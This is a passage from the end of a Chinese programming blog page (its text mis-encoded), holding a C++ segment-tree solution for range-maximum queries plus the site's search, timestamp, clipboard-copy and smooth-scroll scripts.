&lt;p&gt;&lt;strong&gt;Êï∞ÊçÆËåÉÂõ¥&lt;/strong&gt;&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&amp;lt;=n&amp;lt;=10^5,1&amp;lt;=L,R&amp;lt;=n,0&amp;lt;a[i]&amp;lt;10^3&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.5782em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.008548em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8388800000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&amp;lt;=Q&amp;lt;=10^5&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#define ll long long
#define lc num&amp;lt;&amp;lt;1
#define rc num&amp;lt;&amp;lt;1|1
#define N 100001
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
int n,l,r,q;
ll a[N];
struct node{
    int l,r,num;
    ll val,add;
}tre[N*4];
void pushup(int num)
{
    tre[num].val=max(tre[lc].val,tre[rc].val);
}
void build_tre(int l,int r,int num)
{
    tre[num].l=l;tre[num].r=r;
    if(l==r)
    {
        tre[num].val=a[l];
        return ;
    }
    int mid=(tre[num].l+tre[num].r)&amp;gt;&amp;gt;1;
    build_tre(l,mid,lc);
    build_tre(mid+1,r,rc);
    pushup(num);
}
ll query_itv(int l,int r,int num)
{
    ll ans=-0x3f;
    if(tre[num].l&amp;gt;=l&amp;amp;&amp;amp;tre[num].r&amp;lt;=r)
    {
        return tre[num].val;
    }
    int mid=(tre[num].l+tre[num].r)&amp;gt;&amp;gt;1;
    if(l&amp;lt;=mid) ans=max(ans,query_itv(l,r,lc));
    if(r&amp;gt;mid) ans=max(ans,query_itv(l,r,rc));
    return ans;
}

signed main()
{
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
    for(int i=1;i&amp;lt;=n;i++)
    {
        scanf(&amp;quot;%lld&amp;quot;,&amp;amp;a[i]);
    }
    build_tre(1,n,1);
    // cout&amp;lt;&amp;lt;tre[1].val;
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;q);
    while(q--)
    {
        scanf(&amp;quot;%d %d&amp;quot;,&amp;amp;l,&amp;amp;r);
        printf(&amp;quot;%lld\n&amp;quot;,query_itv(l,r,1));
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">Á∫øÊÆµÊ†ëÁª¥Êä§Âå∫Èó¥ÊúÄÂÄºÈóÆÈ¢ò</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + 'Áßí‰πãÂâç';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + 'ÂàÜÈíü‰πãÂâç';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + 'Â∞èÊó∂‰πãÂâç';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + 'Â§©‰πãÂâç';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }

  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // Âà§Êñ≠ÊòØ‰∏çÊòØiosÁ´Ø
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //ÂàõÂª∫ÊñáÊú¨ÂÖÉÁ¥†
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //ÈÄâÊã©ÂÜÖÂÆπ
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //Â§çÂà∂Âà∞Ââ™Ë¥¥Êùø
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("Â§çÂà∂ÈîôËØØÔºÅËØ∑ÊâãÂä®Â§çÂà∂ÔºÅ")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === 'Â§çÂà∂ÊàêÂäü') {
        return;
      }
      e.srcElement.textContent = 'Â§çÂà∂ÊàêÂäü';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === 'Â§çÂà∂ÊàêÂäü') {
            elem.textContent = 'Â§çÂà∂‰ª£Á†Å'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = 'Â§çÂà∂‰ª£Á†Å';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


  <script
    src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
  <script>
    var scroll = new SmoothScroll('a[href*="#"]', {
      speed: 200
    });
  </script>







</html>